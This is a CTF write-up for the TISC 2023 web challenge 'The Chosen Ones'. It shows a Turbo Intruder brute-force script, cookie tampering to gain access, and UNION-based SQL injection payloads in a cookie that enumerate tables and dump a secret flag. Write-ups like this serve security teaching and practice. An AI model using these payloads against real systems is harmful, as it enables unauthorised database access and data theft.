---
title: TISC 2023 - (Level 6b) The Chosen Ones
date: 2023-10-05 20:00:00 +0800
categories: [ctf]
tags: [web]
render_with_liquid: false
image:
    path: /assets/images/tisc2023/tisc2023.jpg
---
## Description

> We have discovered PALINDROME's recruitment site. Infiltrate it and see what you can find!
> 
> [http://chals.tisc23.ctf.sg:51943](http://chals.tisc23.ctf.sg:51943)

## Solution

The website is shown as below:

![](/assets/images/tisc2023/Pasted image 20231001230826.png)

After a number is submitted, it then mentions the correct lucky number.

![](/assets/images/tisc2023/Pasted image 20231001230944.png)

The first guess was that the lucky numbers may accidentally repeat themselves, hence the Turbo Intruder extension in Burp Suite is used to make multiple submissions:

![](/assets/images/tisc2023/Pasted image 20231001232454.png)

Since the number is submitted via the `entry` URL parameter, its value is set to `%s` like so in Turbo Intruder:

```
GET /index.php?entry=%s HTTP/1.1
```

Here is the Turbo Intruder script used:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=10,
                           pipeline=False
                           )

    for i in range(1, 1000000):
        engine.queue(target.req, i)
        
def handleResponse(req, interesting):
    import re
    
    if interesting:
        req.label = "Lucky number: " + re.findall(r"Too bad. The lucky number was (\d+)", req.response)[0]
        table.add(req)
```

The Turbo Intruder script is then executed and the results are shown below:

![](/assets/images/tisc2023/Pasted image 20231001232727.png)

Here, it can be observed that the guess was correct as a few numbers were seen to be repeating. Among these numbers, the lucky number `989691` is chosen and the Turbo Intruder script is updated like so:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=10,
                           pipeline=False
                           )

    for i in range(1, 1000000):
        engine.queue(target.req, 989691)
        
def handleResponse(req, interesting):
    if interesting:
        table.add(req)
```

The Turbo Intruder script is then executed and the results are shown below:

![](/assets/images/tisc2023/Pasted image 20231001233237.png)

Based on this, it can be concluded that if the lucky number is correct, the website adds a cookie `rank=0` and redirect to `main.php`. After adding the `rank=0` to the browser like so:

![](/assets/images/tisc2023/Pasted image 20231001233000.png)

The `/main.php` page is then visited:

![](/assets/images/tisc2023/Pasted image 20231002000749.png)

The page allows for the filtering of the first name and last name of the personnel records. Testing various SQL injection payloads in these fields did not work as the website seems to be blocking them. 

However, it was also observed that the rank of all of these personnels returned seem to coincide with the value of the `rank` cookie in the browser. If the value of the `rank` cookie is set to 1 like so:

![](/assets/images/tisc2023/Pasted image 20231002001320.png)

The page now returns even more personnel records, some with rank 0 and rank 1. This meant the page was also filtering for records that have a `rank` less than or equals to the value of the `rank` cookie:

![](/assets/images/tisc2023/Pasted image 20231002001333.png)

SQL injection payloads were then used on the `rank` cookie and it was discovered to be injectable. The next step was figuring out the number of columns:

```
rank=-1 UNION SELECT null                -- => 500 Internal Server Error
rank=-1 UNION SELECT null,null           -- => 500 Internal Server Error
rank=-1 UNION SELECT null,null,null      -- => 500 Internal Server Error
rank=-1 UNION SELECT null,null,null,null -- => 200 OK
```

The number of columns is 4. The flag is likely stored in another table in the database, hence the next step was viewing all tables names:

```
rank=-1 UNION SELECT TABLE_NAME,null,null,null from information_schema.tables --
```

![](/assets/images/tisc2023/Pasted image 20231002001647.png)

Knowing that the table is `CTF_SECRET`, the next step was viewing all column names:

```
rank=-1 UNION SELECT COLUMN_NAME,null,null,null from information_schema.columns where TABLE_NAME = 'CTF_SECRET' --
```

![](/assets/images/tisc2023/Pasted image 20231002001837.png)

Now that the table name and column name are known, the final step would be to retrieve the flag:

```
rank=-1 UNION SELECT flag,null,null,null from CTF_SECRET --
```

![](/assets/images/tisc2023/Pasted image 20231002001923.png)

## Flag

`TISC{Y0u_4rE_7h3_CH0s3n_0nE}`
